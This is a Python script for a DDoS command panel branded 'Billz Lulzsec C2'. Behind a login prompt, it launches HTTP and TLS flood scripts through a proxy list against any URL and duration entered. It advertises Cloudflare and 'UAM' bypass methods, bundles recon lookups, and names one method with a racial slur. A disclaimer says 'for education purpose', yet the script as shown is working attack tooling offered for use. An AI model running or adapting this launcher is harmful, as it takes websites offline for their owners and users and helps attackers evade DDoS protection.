import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxy = open('proxy.txt').readlines()
bots = len(proxy)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()


def tools():
    clear()
    print(f'''
\033[92mreverseip► Chek url for ip
\033[92mdns ► Check dns
\033[92masn-lookup ► asn lookup
\033[92msubnet-lookup  ►  Subnet lookup
\033[92mreverse-dns ►  Reverse dns
''')

def rules():
    clear()
    print(f'''
                1. For education purpose             
                2. Only attack stress testing servers         
                3. Dont trust anyone                
                4. The creator does not do any harm           
                
''')
    
def layer7():
    clear()
    print("""

 

 

                     _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _ 
(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)
(_)                                                               (_)
(_) 888888ba dPdP       dP                                        (_)
(_) 88    `8b8888       88                                        (_)
(_)a88aaaa8P'8888       88                                        (_)
(_) 88   `8b.8888       88                                        (_)
(_) 88    .888888       88                                        (_)
(_) 88888888PdP88888888P88888888P                                 (_)
(_)dP       dP     dPdP       d8888888P.d88888b  88888888ba88888b.(_)
(_)88       88     8888            .d8'88.    "' 88      d8'   `88(_)
(_)88       88     8888          .d8'  `Y88888b.a88aaaa  88       (_)
(_)88       88     8888        .d8'          `8b 88      88       (_)
(_)88       Y8.   .8P88       d8'      d8'   .8P 88      Y8.   .88(_)
(_)88888888P`Y88888P'88888888PY8888888P Y88888P  88888888PY88888P'(_)
(_) _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _ (_)
(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)                                                                                                                                    
                                                     
                        
                                                                                       
                                                      
\033[92mWelcome: Tools DDoS by Billz Lulzsec
\033[92mMessage: Plan Basic
]-------------------------------------[

[ LAYER - 7 ]

\033[94m
\033[94m– .CFSOCKET | Cloudflare Socket [BASIC]
– .----- | 
– .HENTAI | Hentai Method [Reasonable]
– .RAW | Raw Brutal [Reasonable]
– .SLOW | Slowloris Attack [Reasonable]
– .BRUST | Brust Method [BASIC]
– .GLACIER | Glacier Method [Reasonable]
– .TLS-V2 | Tls Method [Reasonable]
– .HTTPS | Https Method [Reasonable]
– .geo | bypass uam
– .geo2 | bypass uam
– .BYPASS | Bypass Protect [Reasonable]
- .---- |
– .BASIC | Basic Method [Reasonable]
– .IMPROVED | Improved Tls Method [Pretty Hard]
– .BUG | All Methods [VIP]
- .BIGSIZE | All Methods [VIP]
– .NIGGER | Fix Bypass/Flood [VIP]
– .HOLD | Full Bypass [VVIP]
– .LOADDER | Flood Loader [VIP]


\033[94m

[ BILLZ-C2 ]

]-------------------------------------[
\033[94m
""")

def exit_program():
    clear()
    sys.exit()
    print('''C2 Exit''')


def menu():
    sys.stdout.write(f"         \x1b]5; BILLZ-C2 PANEL--> Stars: [{bots}] | Online Users: [1] | Methods: [17] | Bypass: [18]\x07")
    clear()
    print("""

 
 
            |$$$$$  |$$$$$$$$ |$$$$$$  |$$    $$$  |$$$$$$$$ |$$$$$$$$$$
            |$$     |$$    $$ |$$      |$$  $$$    |$$           |$$
            |$$     |$$    $$ |$$      |$$$$$      |$$           |$$
            |$$$$%  |$$    $$ |$$      |$$$$$      |$$$$$$$$     |$$
            |$$     |$$    $$ |$$      |$$  $$$    |$$           |$$
            |$$     |$$    $$ |$$      |$$   $$$   |$$           |$$
            |$$     |$$$$$$$$ |$$$$$$$ |$$     $$$ |$$$$$$$$     |$$

                                                                                       
                                        
 \033[39mWelcome - BILLZ LULZSEC [ C2 ].             
 
\033[92mAttack Tools
\033[92mWelcome: Tools DOS By Billz Type [help] To Start Attack
\033[92mEnjoy Your Stay
""")

def main():
    menu()
    while(True):
        cnc = input('''\033[38;5;208m┌──(root㉿Billz-Dos)-[\033[32m/Attack\033[38;5;208m]\033[0m
\033[38;5;208m└─\033[0m#\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m''')
        if cnc == "method" or cnc == "methods" or cnc == "METHODS" or cnc == "METHOD":
            layer7()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "exit" or cnc == "ext" or cnc == "EXIT" or cnc == "Exit":
            exit_program()


# LAYER 7 METHODS
 
        elif "CFSOCKET" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node cf1.js {url} {time}')
            except IndexError:
                print('Usage: CFSOCKET  <target> <time>')
                
        elif "-" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node - {url} {time} 10 GET proxy.txt 500')
            except IndexError:
                print('Usage: - <url> <time> <thread> <GET/POST> <proxy> <rps>')
                
        elif "HENTAI" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'go run hentai.go -host {url} -time {time}')
            except IndexError:
                print('Usage: HENTAI <url> <time>')
                
        elif "FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                ascii_vro()
                os.system(f'go run xcddos.go -site {url} -data {method}')
            except IndexError:
                print('Usage: FLOOD -site <url> -data <method GET/POST>')
                
        elif "SLOW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node lol.js {url} {time} {rate} {thread} {proxy}')
            except IndexError:
                print('Usage: SLOW <url> <time> <rate> <thread> <proxy>')
                
        elif "BRUST" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                ascii_vro()
                os.system(f'go run strike.go {url} {time} {rate} {proxy} {thread}')
            except IndexError:
                print('Usage: BRUST <url> <time> <ratelimit> <proxy> <thread>')
                
        elif "BLOD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                ascii_vro()
                os.system(f'node bypassUAM.js {url} {time} {rate} {proxy} {thread}')
            except IndexError:
                print('Usage: BLOD <url> <time> <ratelimit> <rate> proxy> <thread>')
                
                
        elif "GLACIER" in cnc:
            try:
                method = cnc.split()[1]
                url = cnc.split()[2]
                proxy = cnc.split()[3]
                time = cnc.split()[4]
                rps = cnc.split()[5]
                thread = cnc.split()[6]
                ascii_vro()
                os.system(f'node CF-GLACIER.js {method} {url} {proxy} {time} {rps} {thread}')
            except IndexError:
                print('Usage: GLACIER <GET/POST> <url> <proxy> <time> <rps> <thread>')
                
        elif "TLS-V2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node TLS-V2.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: TLS-V2 <url> <time> <rps> <thread>')
                
        elif "RAW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node RAW.js {url} {time}')
            except IndexError:
                print('Usage: RAW <url> <time>')
                
        elif "HTTPS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node HTTP.js GET {url} proxy.txt {time} 64 10')
            except IndexError:
                print('Usage: HTTPS <url> <time>')
                
        elif "geo" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                ascii_vro()
                os.system(f'node geo.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Usage: - <url> <time> <rps> <thread> <proxy>')
                
        elif "-" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node - {url} {time} {rate} {thread}')
            except IndexError:
                print('Usage: CRASH <url> <time> <rate> <thread>')
                
        elif "BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node NOX.js {url} {time} 10 64 proxy.txt http.txt')
                os.system(f'node BYPASS.js {url} {time} 64 10 proxy.txt http.txt')
                os.system(f'node HTTP-BYPASS.js {url} {time} 10 proxy.txt http.txt proxies.txt')
            except IndexError:
                print('Usage: BYPASS <url> <time>')
                
        elif "geo2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                proxy = cnc.split()[4]
                rps = cnc.split()[5]
                ascii_vro()
                os.system(f'node geo2.js {url} {time} {thread} {proxy} {rps}')
            except IndexError:
                print('Usage: geo2 <url> <time> <thread> <proxy> <rps>')
                
        elif "IMPROVED" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                ascii_vro()
                os.system(f'node improved-tls.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Usage: IMPROVED <url> <time> <rps> <thread> <proxy>')
                
        elif "BASIC" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                ascii_vro()
                os.system(f'node anus.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Usage: BASIC <url> <time> <rps> <thread> <proxy>')
                
        elif "BUG" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node improved-tls.js {url} {time} 64 10 proxy.txt')
                os.system(f'node http-xv.js GET 10 {url} {time} 64')
                os.system(f'node anus.js {url} {time} 64 10 proxy.txt')
                os.system(f'node narutov1.js {url} {time} 64 10')
                os.system(f'node EVOLUTIONS.js {url} 10 64 {time}')
                os.system(f'node NOX.js {url} {time} 10 64 proxy.txt http.txt')
            except IndexError:
                print('Usage: BUG <url> <time>')
                print('INI ADALAH METHOD CAMPURAN')
                
        elif "NIGGER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node HTTP.js {url} {time} 10 64 proxy.txt')
                os.system(f'node HTTP-ENTOD.js {url} {time} ua.txt 10 GET proxy.txt proxies.txt')
                os.system(f'node RAW.js {url} {time}')
                os.system(f'node TLS-V2.js {url} {time} 64 10')
                os.system(f'go run hentai.go -host {url} -time {time}')
                os.system(f'go run xcddos.go -site {url} -data GET')
            except IndexError:
                print('Usage: BUG <url> <time>')
                print('INI ADALAH METHOD CAMPURAN')
                
        elif "BIGSIZE" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node TLS-VIP.js {url} {time} 64 5')
                os.system(f'node TLS-kill.js {url} 5 100 GET {time}')
                os.system(f'node TLS-AQUA.js {url} {time} 64 5 proxy.txt')
            except IndexError:
                print('Usage: BIGSIZE <url> <time> <method GET>')
                print('INI ADALAH METHOD CAMPURAN')
                
        elif "HOLD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node hold.js {url} {time} 64 10 proxy.txt')
                os.system(f'node gflood.js {url} {time} 64 10 proxy.txt')
            except IndexError:
                print('Usage: HOLD <url> <time>')
                
        elif "LOADDER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node gflood.js {url} {time} {rps} {thread} proxy.txt')
            except IndexError:
                print('Usage: LOADDER <url> <time> <rps> <thread>')
                
       
       
#TOOLS

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns" in cnc:
            try:
                domain = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={domain}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns <dns>')
                print('Example: dns google.com')

        elif "reverse-dns" in cnc:
            try:
                domain = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={domain}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')
                

        elif "help" in cnc:
            print(f'''
METHOD ► SHOW ALL METHOD
RULES      ► RULES PANEL
TOOLS     ► SHOW TOOLS
CLEAR    ► CLEAR TERMINAL
Exit    ► Keluar dari tools
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = ""
    passwd = ""
    username = input(" 🚀 Username: ")
    password = getpass.getpass(prompt='🚀 Password: ')
    if username != user or password != passwd:
        print("")
        print("🚀 Wrong Pass.")
        sys.exit(1)
    elif username == user and password == passwd:
        print("🚀 Welcome to C2 PANEL!")
        main()

login()
